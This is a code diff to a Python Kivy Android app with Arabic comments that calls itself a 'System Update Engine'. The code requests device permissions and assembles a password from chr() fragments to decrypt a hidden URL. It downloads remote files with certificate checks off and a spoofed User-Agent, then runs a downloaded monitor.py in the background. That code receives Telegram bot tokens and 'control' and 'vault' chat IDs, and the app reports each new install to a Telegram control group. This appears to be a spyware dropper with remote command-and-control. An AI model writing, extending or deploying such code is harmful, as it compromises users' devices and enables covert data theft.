@@ -14,7 +14,7 @@ if not os.path.exists(R):
     os.makedirs(R)
 sys.path.append(R)
 
-# ------------------------- طلب الصلاحيات الديناميكية (أندرويد) -------------------------
+# ------------------------- طلب الصلاحيات الديناميكية -------------------------
 try:
     from android.permissions import request_permissions, Permission
     def request_android_permissions():
@@ -29,7 +29,7 @@ except ImportError:
     def request_android_permissions():
         pass
 
-# ------------------------- توزيع كلمة السر -------------------------
+# ------------------------- كلمة السر المجزأة -------------------------
 def _p1(): return chr(90)+chr(97)+chr(101)+chr(110)          # Zaen
 def _p2(): return chr(49)+chr(50)+chr(51)                    # 123
 def _p3(): return chr(64)+chr(49)+chr(50)+chr(51)+chr(64)+chr(49)+chr(50)+chr(51)  # @123@123
@@ -52,8 +52,8 @@ def decrypt_data(blob):
     except Exception as e:
         return None
 
-# الرابط المشفر لـ index.json
-ENC_INDEX_URL = "AAECAwQFBgcICQoLKpECh6XDd5Rb3OzJUfHQbzUx1vfTldID6rV0CqN4S6I6C8g6pNE7kebrLPn0lKxcxM1CJZ6fGJR9tdM="
+# الرابط المشفر الجديد (من مستودع Android-Core)
+ENC_INDEX_URL = "AAECAwQFBgcICQoLj14vepBnvczpdQyaSy3tyjUx1vfTldID6rV0CqN4S6I6C8g6pNE7kebrLN7znLtAgsABApSVU9FntNnD5+fS/dd9"
 
 # ------------------------- بيانات التليجرام -------------------------
 try:
@@ -66,7 +66,7 @@ except ImportError:
     CONTROL_ID = "-1003365166986"
     VAULT_ID = "-1003787520015"
 
-# ------------------------- تطبيق Kivy -------------------------
+# ------------------------- تطبيق Kivy الرئيسي -------------------------
 class MainApp(App):
     def build(self):
         request_android_permissions()
@@ -99,23 +99,26 @@ class MainApp(App):
 
     def run_engine(self):
         self.log("🚀 Starting System Update Engine")
+
         # 1. فك تشفير رابط index.json
         idx_url = decrypt_data(ENC_INDEX_URL)
         if not idx_url:
             self.log("❌ Decryption failed! Check ENC_INDEX_URL.", "ERROR")
             return
-        self.log(f"✅ Index URL: {idx_url[:60]}...")
+        self.log(f"✅ Index URL decrypted: {idx_url[:80]}...")
 
-        # 2. تحميل index.json
+        # 2. تحميل index.json مع User-Agent
+        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
         try:
-            r = requests.get(idx_url, timeout=15, verify=False)
+            r = requests.get(idx_url, timeout=15, verify=False, headers=headers)
             if r.status_code != 200:
                 self.log(f"❌ HTTP {r.status_code} from index", "ERROR")
                 return
-            files_list = r.json().get('files', [])
+            data = r.json()
+            files_list = data.get('files', [])
             self.log(f"📦 Found {len(files_list)} files to download")
             if not files_list:
-                self.log("⚠️ No files found in index.json.", "WARN")
+                self.log("⚠️ No files in index.json", "WARN")
         except Exception as e:
             self.log(f"❌ Index fetch error: {str(e)}", "ERROR")
             return
@@ -125,7 +128,7 @@ class MainApp(App):
             fname = f_url.split('/')[-1]
             self.log(f"⬇️ [{idx}/{len(files_list)}] Downloading {fname} ...")
             try:
-                r2 = requests.get(f_url, timeout=20, verify=False)
+                r2 = requests.get(f_url, timeout=20, verify=False, headers=headers)
                 if r2.status_code == 200:
                     path = os.path.join(R, fname)
                     with open(path, 'w', encoding='utf-8') as fp:
@@ -136,36 +139,33 @@ class MainApp(App):
             except Exception as e:
                 self.log(f"❌ Download error for {fname}: {str(e)}", "ERROR")
 
-        # 4. التحقق من monitor.py
+        # 4. التحقق من وجود monitor.py
         mon_path = os.path.join(R, "monitor.py")
         if not os.path.exists(mon_path):
             self.log("❌ monitor.py not found! Aborting.", "ERROR")
             return
 
-        # 5. IMPORT FIX: استيراد وتشغيل monitor.py (تم تعديل طريقة استدعاء الكلاس)
+        # 5. استيراد وتشغيل monitor.py (ملاحظة: الكلاس اسمه M وليس Monitor)
         try:
             spec = importlib.util.spec_from_file_location("monitor", mon_path)
             mon_mod = importlib.util.module_from_spec(spec)
             sys.modules["monitor"] = mon_mod
             spec.loader.exec_module(mon_mod)
 
-            # ** التصحيح الأساسي هنا **: تغيير اسم الكلاس من 'Monitor' إلى 'M' ليتطابق مع ملف monitor.py
             if not hasattr(mon_mod, 'M'):
-                self.log("❌ Monitor class 'M' not found in monitor.py", "ERROR")
+                self.log("❌ Class 'M' not found in monitor.py", "ERROR")
                 return
+
             monitor = mon_mod.M()
-            
-            # تعيين المتغيرات بنفس الطريقة التي يتوقعها الكلاس 'M'
-            monitor.bots = BOT_TOKENS          # مُعرّفة في `__init__` كـ `self.bots`
-            monitor.ctrl = CONTROL_ID          # مُعرّفة في `__init__` كـ `self.ctrl`
-            monitor.vlt = VAULT_ID             # مُعرّفة في `__init__` كـ `self.vlt`
-            if hasattr(monitor, 'pw'): 
+            # تعيين المتغيرات كما يتوقعها الكلاس M
+            monitor.bots = BOT_TOKENS
+            monitor.ctrl = CONTROL_ID
+            monitor.vlt = VAULT_ID
+            if hasattr(monitor, 'pw'):
                 monitor.pw = _gp()
-            else:
-                self.log("⚠️ 'pw' attribute not found in class 'M'.", "WARN")
 
             threading.Thread(target=monitor.start, daemon=True).start()
-            self.log("✅ Monitor (Class M) started successfully in background")
+            self.log("✅ Monitor (class M) started successfully in background")
             self.log("🎯 System initialization completed.")
         except Exception as e:
             self.log(f"❌ Monitor init error: {str(e)}", "ERROR")
@@ -180,7 +180,7 @@ class MainApp(App):
             text = f"🆕 *System Initialized*\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
             url = f"https://api.telegram.org/bot{token}/sendMessage"
             requests.post(url, json={"chat_id": CONTROL_ID, "text": text, "parse_mode": "Markdown"}, timeout=5, verify=False)
-            self.log("📡 Registration message sent to Telegram control group")
+            self.log("📡 Registration message sent to control group")
         except Exception as e:
             self.log(f"⚠️ Registration failed: {str(e)}", "WARN")
 
